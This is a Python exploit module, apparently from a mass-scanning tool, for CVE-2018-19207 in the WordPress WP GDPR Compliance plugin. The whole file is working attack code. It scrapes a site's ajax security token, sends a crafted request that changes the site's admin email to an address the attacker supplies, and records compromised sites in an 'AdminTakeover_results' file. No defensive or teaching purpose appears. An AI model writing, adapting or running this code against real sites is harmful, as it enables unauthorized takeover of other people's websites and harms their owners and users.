# coding=utf-8
import requests, re, json
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}




def Exploit(site, email):
    try:
        Ex1 = 'http://' + site + '/wp-admin/admin-ajax.php'
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        GET = requests.get('http://' + site, headers=headers, timeout=10)
        AjaxTokEN = re.findall('"ajaxSecurity":"(.*)"', str(GET.content))[0]
        payload = {'action': 'wpgdprc_process_action', 'security': str(AjaxTokEN)}
        payload['data'] = json.dumps({
            'type': 'save_setting',
            'append': False,
            'option': 'new_admin_email',
            'value': email,
        })
        GG = requests.post(Ex1, timeout=10, headers=headers, data=payload)
        if '{"message":"","error":""}' in str(GG.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + '/wp-login.php --> reset Link Sended to: {}'
                                    '\n------------------------------------------\n'.format(email))
            return printModule.returnYes(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')
        else:
            return printModule.returnNo(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2018-19207', 'WP GDPR Compliance', 'Wordpress')